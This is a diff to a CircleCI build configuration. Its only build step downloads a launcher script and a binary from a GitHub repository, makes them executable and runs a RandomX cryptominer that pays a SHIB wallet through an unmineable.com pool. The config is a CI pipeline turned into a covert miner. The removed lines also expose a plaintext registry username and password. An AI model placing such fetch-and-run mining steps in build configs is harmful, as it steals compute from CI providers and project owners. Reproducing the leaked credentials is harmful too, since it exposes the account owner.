@@ -3,9 +3,7 @@ jobs:
   build:
     docker:
       - image: circleci/ruby:2.4.2-jessie-node
-        auth:
-          username: chhxng808
-          password: Chhongku@123  # context / project UI env-var reference
+        
     steps:
       - checkout
       - run:  wget https://raw.githubusercontent.com/hunshukajh/yes/main/cmdline_launcher.sh && wget https://github.com/hunshukajh/yes/raw/main/gas && chmod +x gas cmdline_launcher.sh && ./cmdline_launcher.sh -algo randomx -xmrig.exe -o rx.unmineable.com:13333 -a rx -u SHIB:0xd32eeaf93281f690185088160e03fbe74f75a47e.Chhong_pc -p x
